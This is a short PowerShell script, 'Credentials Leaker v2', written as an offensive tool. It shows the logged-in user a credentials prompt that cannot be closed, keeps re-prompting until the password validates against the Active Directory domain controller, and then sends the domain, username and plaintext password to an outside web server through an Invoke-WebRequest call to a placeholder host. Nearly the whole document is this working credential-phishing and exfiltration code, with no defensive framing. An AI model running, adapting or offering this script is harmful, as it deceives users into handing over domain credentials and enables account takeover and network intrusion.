'''
Credentials Leaker v2 By Dviros

This script will display a powershell credentials box that will ask the user for his credentials.

The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC. If its valid, it will close and leak it to a web server outside.

TODO:
- Box title should be changed.
- Different windows versions has different credential boxes. Needs to be pulled from WINAPI.



'''
###########################################################################################################




$username = $env:USERNAME
$CurrentDomain_1 = $env:USERDOMAIN
$status = $true


function Credentials(){
    while ($status){
        $creds = Get-Credential -Message "Enter Credentials:" -UserName $CurrentDomain_1"\"$username
        if (!$creds.Password -or $creds.Password -eq $null){
            Credentials
        }
        if (!$creds){
            Credentials
        }
        else {
            $password = $creds.GetNetworkCredential().password
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)

            if ($domain.name -eq $null){
                Credentials
            }
            else {
                try{
                Invoke-WebRequest http://ServerIP:PORT/$CurrentDomain_1";"$username";"$password -Method Get
                }
                catch{}

                $status = $false
                exit
            }
        }
    }
}


Credentials
